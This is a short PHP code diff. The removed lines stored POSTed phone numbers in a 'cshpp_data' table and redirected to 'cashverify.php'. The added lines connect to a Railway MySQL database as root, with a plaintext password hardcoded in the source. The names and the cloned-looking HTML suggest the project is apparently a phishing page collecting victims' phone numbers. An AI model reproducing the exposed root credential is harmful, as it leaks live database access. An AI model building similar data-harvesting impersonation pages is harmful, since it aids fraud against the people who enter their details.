@@ -1,30 +1,10 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $conn = new mysqli('localhost', 'root', '', 'my_base');
-    if ($conn->connect_error) {
-        die("Connectie mislukt: " . $conn->connect_error);
-    }
-
-    $phone = $_POST['phone'] ?? '';
-    $_SESSION['phone'] = $phone;
-
-    if (!empty($phone)) {
-        $stmt = $conn->prepare("INSERT INTO cshpp_data (phone_number) VALUES (?)");
-        $stmt->bind_param("s", $phone);
-        $stmt->execute();
-        $stmt->close();
-        $conn->close();
-
-        header("Location: cashverify.php");
-        exit();
-    } else {
-        echo "Telefoonnummer ontbreekt.";
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
-
 
 <!DOCTYPE html>
 <html lang=en-US data-whatinput=initial data-whatintent=mouse><!--
